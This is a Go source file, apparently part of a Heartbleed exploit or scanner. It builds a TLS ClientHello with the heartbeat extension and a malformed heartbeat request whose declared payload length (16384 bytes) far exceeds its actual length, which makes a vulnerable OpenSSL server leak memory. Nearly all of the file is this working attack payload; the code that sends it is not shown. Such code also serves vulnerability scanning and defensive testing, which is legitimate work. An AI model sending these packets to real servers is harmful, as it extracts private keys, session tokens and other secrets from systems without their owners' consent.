package heartbleed

import (
	"bytes"
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
)

// TLS record types.
const (
	recordTypeHandshake  = 0x16
	recordTypeHeartbeat  = 0x18
	heartbeatMessageType = 0x01
	handshakeTypeHello   = 0x01
	defaultHeartbeatLen  = 0x4000 // 16384 bytes
)

// HeartbeatMessage represents the structure of a TLS heartbeat message.
type HeartbeatMessage struct {
	ContentType uint8
	TLSVersion  uint16
	Length      uint16
	HBType      uint8
	PayloadLen  uint16
}

// ClientHelloMessage represents the structure of a TLS client hello message.
type ClientHelloMessage struct {
	ContentType   uint8
	TLSVersion    uint16
	Length        uint16
	HandshakeType uint8
	HSLength      [3]byte // 24-bit integer
	HSVersion     uint16
	Random        [32]byte
}

func makePayload(tlsVers int) []byte {
	buf := new(bytes.Buffer)
	msg := HeartbeatMessage{
		ContentType: recordTypeHeartbeat,
		TLSVersion:  uint16(tlsVers),
		Length:      3, // fixed length for heartbeat
		HBType:      heartbeatMessageType,
		PayloadLen:  defaultHeartbeatLen,
	}

	_ = binary.Write(buf, binary.BigEndian, msg.ContentType)
	_ = binary.Write(buf, binary.BigEndian, msg.TLSVersion)
	_ = binary.Write(buf, binary.BigEndian, msg.Length)
	_ = binary.Write(buf, binary.BigEndian, msg.HBType)
	_ = binary.Write(buf, binary.BigEndian, msg.PayloadLen)

	return buf.Bytes()
}

func makeClientHello(tlsVers int) []byte {
	buf := new(bytes.Buffer)

	// Generate random bytes for the client hello
	var random [32]byte

	_, _ = rand.Read(random[:])

	// Create client hello header
	msg := ClientHelloMessage{
		ContentType:   recordTypeHandshake,
		TLSVersion:    uint16(tlsVers),
		Length:        0xdc, // Total length of handshake message
		HandshakeType: handshakeTypeHello,
		HSLength:      [3]byte{0, 0, 0xd8}, // Handshake message length (24-bit)
		HSVersion:     uint16(tlsVers),
		Random:        random,
	}

	// Write the header
	_ = binary.Write(buf, binary.BigEndian, msg.ContentType)
	_ = binary.Write(buf, binary.BigEndian, msg.TLSVersion)
	_ = binary.Write(buf, binary.BigEndian, msg.Length)
	_ = binary.Write(buf, binary.BigEndian, msg.HandshakeType)
	buf.Write(msg.HSLength[:])
	_ = binary.Write(buf, binary.BigEndian, msg.HSVersion)
	buf.Write(msg.Random[:])

	// Write the rest of the client hello (cipher suites, compression methods, extensions)
	restOfHello := "000066c014c00ac022c0210039003800880087c00fc00500350084c012c008c01cc01b00160013c00dc003000ac013c009c01fc01e00330032009a009900450044c00ec004002f00960041c011c007c00cc002000500040015001200090014001100080006000300ff01000049000b000403000102000a00340032000e000d0019000b000c00180009000a00160017000800060007001400150004000500120013000100020003000f0010001100230000000f000101"
	restBytes, _ := hex.DecodeString(restOfHello)
	buf.Write(restBytes)

	return buf.Bytes()
}
